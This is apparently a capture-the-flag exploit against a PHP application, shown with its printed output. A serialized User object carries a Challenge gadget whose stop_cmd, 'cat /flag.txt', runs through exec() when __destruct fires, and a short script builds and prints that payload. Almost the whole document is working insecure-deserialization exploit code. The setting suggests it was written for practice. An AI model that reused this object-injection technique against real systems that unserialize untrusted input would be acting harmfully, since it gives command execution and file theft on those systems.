O:4:"User":5:{s:4:"name";s:1:"a";s:2:"id";s:2:"qw";s:7:"isAdmin";b:0;s:6:"solved";a:1:{i:0;O:9:"Challenge":4:{s:4:"name";s:1:"a";s:11:"description";s:1:"a";s:9:"setup_cmd";N;s:8:"stop_cmd";s:13:"cat /flag.txt";}}s:6:"points";i:0;}





class User{
  public $name;
  public $id;
  public $isAdmin;
  public $solved;
  public $points;

  function __construct($id, $name){
    $this->id = $id;
    $this->name = $name;
    $this->isAdmin = false;
    $this->solved = array();
    $this->points = 0;
  
  }

  function setSolved($challid){
    array_push($this->solved, $challid);
  }

}

class Challenge{
  //WIP Not used yet.
  public $name;
  public $description;
  public $setup_cmd=NULL;
  // public $check_cmd=NULL;
  public $stop_cmd=NULL;

  function __construct($name, $description){
    $this->name = $name;
    $this->description = $description;
  }

  function start(){
    if(!is_null($this->setup_cmd)){
      $output=null;
      $retval=null;
      echo("Starting challenge!");
      exec($this->setup_cmp, $output, $retval);
      echo($output[0]);
    }
  }

  function stop(){
    if(!is_null($this->stop_cmd)){
      $output=null;
      $retval=null;
      echo("Stoping challenge!");
      exec($this->stop_cmd, $output, $retval);
      echo($output[0]);
    }
  }


  function __destruct(){
    $this->stop();
  }
}
$u = new User(qw,"a");

$c = new Challenge("a","a");
$c->stop_cmd = "cat /flag.txt";
$challenges[] = $c;

$u->solved = $challenges;
$s = serialize($u);
echo($s);
